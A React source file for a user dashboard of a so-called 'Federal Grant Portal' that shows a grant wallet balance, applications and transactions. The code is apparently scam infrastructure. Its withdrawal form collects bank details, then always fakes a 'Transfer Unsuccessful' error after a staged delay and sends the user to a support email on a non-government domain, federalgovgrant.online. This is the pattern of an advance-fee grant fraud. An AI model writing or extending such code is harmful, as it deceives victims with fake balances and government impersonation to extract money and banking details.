import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Skeleton } from '@/components/ui/skeleton';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { toast } from 'sonner';
import { Wallet, ArrowUpRight, LogOut, FileText, Shield, Plus, ArrowDownToLine, AlertTriangle, Loader2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import type { Database } from '@/integrations/supabase/types';

type WalletRow = Database['public']['Tables']['wallets']['Row'];
type Transaction = Database['public']['Tables']['transactions']['Row'];
type Application = Database['public']['Tables']['applications']['Row'];

export default function UserDashboard() {
  const { user, signOut, isAdmin } = useAuth();
  const navigate = useNavigate();
  const [wallet, setWallet] = useState<WalletRow | null>(null);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [applications, setApplications] = useState<Application[]>([]);
  const [loading, setLoading] = useState(true);
  const [balanceFlash, setBalanceFlash] = useState(false);

  // Withdraw modal state
  const [withdrawOpen, setWithdrawOpen] = useState(false);
  const [withdrawLoading, setWithdrawLoading] = useState(false);
  const [withdrawError, setWithdrawError] = useState(false);
  const [routingNumber, setRoutingNumber] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountName, setAccountName] = useState('');

  const fetchData = async () => {
    if (!user) return;
    const [walletRes, txRes, appRes] = await Promise.all([
      supabase.from('wallets').select('*').eq('user_id', user.id).single(),
      supabase.from('transactions').select('*').eq('user_id', user.id).order('created_at', { ascending: false }),
      supabase.from('applications').select('*').eq('user_id', user.id).order('created_at', { ascending: false }),
    ]);
    if (walletRes.data) setWallet(walletRes.data);
    if (txRes.data) setTransactions(txRes.data);
    if (appRes.data) setApplications(appRes.data);
    setLoading(false);
  };

  useEffect(() => { fetchData(); }, [user]);

  // Realtime subscription for wallet updates
  useEffect(() => {
    if (!user) return;
    const channel = supabase
      .channel('wallet-updates')
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'wallets',
        filter: `user_id=eq.${user.id}`,
      }, (payload) => {
        setWallet(payload.new as WalletRow);
        setBalanceFlash(true);
        setTimeout(() => setBalanceFlash(false), 1000);
        toast.success('Your balance has been updated!');
      })
      .subscribe();

    const txChannel = supabase
      .channel('tx-updates')
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'transactions',
        filter: `user_id=eq.${user.id}`,
      }, (payload) => {
        setTransactions(prev => [payload.new as Transaction, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(txChannel);
    };
  }, [user]);

  const formatCurrency = (n: number) => `$${Number(n).toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
  const formatDate = (d: string) => new Date(d).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });

  const statusColors: Record<string, string> = {
    pending: 'bg-yellow-100 text-yellow-800 border-yellow-200',
    approved: 'bg-blue-100 text-blue-800 border-blue-200',
    rejected: 'bg-red-100 text-red-800 border-red-200',
    credited: 'bg-emerald-100 text-emerald-800 border-emerald-200',
  };

  const handleWithdrawSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!routingNumber.trim() || !bankName.trim() || !accountName.trim()) {
      toast.error('Please fill in all fields.');
      return;
    }
    setWithdrawLoading(true);
    setTimeout(() => {
      setWithdrawLoading(false);
      setWithdrawError(true);
    }, 3500);
  };

  const resetWithdrawModal = () => {
    setWithdrawOpen(false);
    setWithdrawLoading(false);
    setWithdrawError(false);
    setRoutingNumber('');
    setBankName('');
    setAccountName('');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background p-8">
        <div className="max-w-4xl mx-auto space-y-6">
          <Skeleton className="h-48 w-full" />
          <Skeleton className="h-64 w-full" />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card">
        <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Shield className="h-5 w-5 text-primary" />
            <h1 className="text-lg font-semibold">Federal Grant Portal</h1>
          </div>
          <div className="flex items-center gap-3">
            {isAdmin && (
              <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>
                Admin Panel
              </Button>
            )}
            <Button variant="ghost" size="sm" onClick={signOut}>
              <LogOut className="mr-2 h-4 w-4" /> Sign Out
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-6 py-8 space-y-8">
        {/* Grant Wallet Card */}
        <Card className="overflow-hidden">
          <div className="bg-gradient-to-br from-[hsl(220,40%,13%)] to-[hsl(220,60%,25%)] p-8 text-[hsl(0,0%,100%)]">
            <div className="flex items-center gap-2 mb-1 opacity-80">
              <Wallet className="h-5 w-5" />
              <span className="text-sm font-medium uppercase tracking-wider">Grant Wallet Balance</span>
            </div>
            <p className={`text-4xl font-bold tracking-tight transition-colors ${balanceFlash ? 'balance-flash' : ''}`}>
              {wallet ? formatCurrency(wallet.balance) : '$0.00'}
            </p>
            <p className="mt-2 text-sm opacity-60">
              Available grant funds
            </p>
            <Button
              className="mt-4 bg-[hsl(0,0%,100%)] text-[hsl(222,47%,11%)] hover:bg-[hsl(0,0%,90%)] font-semibold"
              size="lg"
              onClick={() => setWithdrawOpen(true)}
            >
              <ArrowDownToLine className="mr-2 h-4 w-4" /> Withdraw Funds
            </Button>
          </div>
        </Card>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Applications */}
          <Card>
            <CardHeader className="flex flex-row items-center justify-between">
              <CardTitle className="text-base font-semibold flex items-center gap-2">
                <FileText className="h-4 w-4" /> My Applications
              </CardTitle>
              <Button size="sm" onClick={() => navigate('/apply')}>
                <Plus className="mr-1 h-3.5 w-3.5" /> New Application
              </Button>
            </CardHeader>
            <CardContent>
              {applications.length === 0 ? (
                <p className="text-sm text-muted-foreground text-center py-8">No applications yet</p>
              ) : (
                <div className="space-y-3">
                  {applications.map(app => (
                    <div key={app.id} className="flex items-center justify-between p-3 rounded-md border bg-muted/30">
                      <div>
                        <p className="font-medium text-sm">{formatCurrency(app.amount_requested)}</p>
                        <p className="text-xs text-muted-foreground">{formatDate(app.created_at)}</p>
                      </div>
                      <Badge variant="outline" className={statusColors[app.status]}>{app.status}</Badge>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          {/* Transactions */}
          <Card>
            <CardHeader>
              <CardTitle className="text-base font-semibold flex items-center gap-2">
                <ArrowUpRight className="h-4 w-4" /> Transaction History
              </CardTitle>
            </CardHeader>
            <CardContent>
              {transactions.length === 0 ? (
                <p className="text-sm text-muted-foreground text-center py-8">No transactions yet</p>
              ) : (
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Description</TableHead>
                      <TableHead>Date</TableHead>
                      <TableHead className="text-right">Amount</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {transactions.map(tx => (
                      <TableRow key={tx.id}>
                        <TableCell className="text-sm">{tx.description || 'Grant Credit'}</TableCell>
                        <TableCell className="text-sm text-muted-foreground">{formatDate(tx.created_at)}</TableCell>
                        <TableCell className="text-right font-semibold text-emerald-600">+{formatCurrency(tx.amount)}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              )}
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Withdraw Modal */}
      <Dialog open={withdrawOpen} onOpenChange={(open) => { if (!open) resetWithdrawModal(); }}>
        <DialogContent className="sm:max-w-md">
          {withdrawError ? (
            <>
              <div className="flex flex-col items-center text-center py-4">
                <div className="h-16 w-16 rounded-full bg-destructive/10 flex items-center justify-center mb-4">
                  <AlertTriangle className="h-8 w-8 text-destructive" />
                </div>
                <DialogHeader>
                  <DialogTitle className="text-destructive text-xl">Transfer Unsuccessful</DialogTitle>
                  <DialogDescription className="text-base mt-2">
                    Due to some issues with your account!! Please message our support.
                  </DialogDescription>
                </DialogHeader>
                <a
                  href="mailto:eligibleoffer@federalgovgrant.online"
                  className="mt-6 w-full"
                >
                  <Button className="w-full" variant="destructive" size="lg">
                    Contact Support
                  </Button>
                </a>
              </div>
            </>
          ) : withdrawLoading ? (
            <div className="flex flex-col items-center justify-center py-12 gap-4">
              <Loader2 className="h-10 w-10 animate-spin text-primary" />
              <p className="text-sm text-muted-foreground font-medium">Processing your withdrawal…</p>
            </div>
          ) : (
            <>
              <DialogHeader>
                <DialogTitle>Withdraw Funds</DialogTitle>
                <DialogDescription>
                  Enter your bank details to transfer your grant funds.
                </DialogDescription>
              </DialogHeader>
              <form onSubmit={handleWithdrawSubmit} className="space-y-4 mt-2">
                <div className="space-y-2">
                  <Label htmlFor="routingNumber">Routing Number</Label>
                  <Input
                    id="routingNumber"
                    placeholder="e.g. 021000021"
                    value={routingNumber}
                    onChange={e => setRoutingNumber(e.target.value)}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="bankName">Name of Bank</Label>
                  <Input
                    id="bankName"
                    placeholder="e.g. Chase Bank"
                    value={bankName}
                    onChange={e => setBankName(e.target.value)}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="accountName">Account Name</Label>
                  <Input
                    id="accountName"
                    placeholder="e.g. John Doe"
                    value={accountName}
                    onChange={e => setAccountName(e.target.value)}
                    required
                  />
                </div>
                <Button type="submit" className="w-full" size="lg">
                  <ArrowDownToLine className="mr-2 h-4 w-4" /> Send Withdrawal
                </Button>
              </form>
            </>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
